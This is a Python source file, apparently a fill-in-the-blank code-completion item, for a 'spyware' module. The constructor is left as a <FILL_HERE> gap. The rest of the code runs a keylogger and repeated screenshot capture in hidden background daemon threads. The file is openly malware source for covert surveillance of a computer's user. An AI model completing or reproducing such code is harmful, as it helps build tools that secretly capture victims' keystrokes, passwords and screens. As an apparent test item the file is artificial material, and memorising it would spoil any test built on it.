# Main spyware module that initializes and manages the spyware operations.

import os
import time
import threading
from keylogger import Keylogger
from screenshot import Screenshot

class Spyware:
    def __init__(self, interval=60):
        <FILL_HERE>
    def start(self):
        """
        Starts the spyware operations, including keylogging and screenshot capturing.
        """
        # Start keylogger in a separate thread
        keylogger_thread = threading.Thread(target=self.keylogger.start)
        keylogger_thread.daemon = True
        keylogger_thread.start()

        # Start screenshot capturing in a separate thread
        screenshot_thread = threading.Thread(target=self.capture_screenshots)
        screenshot_thread.daemon = True
        screenshot_thread.start()

    def capture_screenshots(self):
        """
        Captures screenshots at regular intervals and saves them to a file.
        """
        while True:
            self.screenshot.capture()
            time.sleep(self.interval)

if __name__ == "__main__":
    spyware = Spyware(interval=60)
    spyware.start()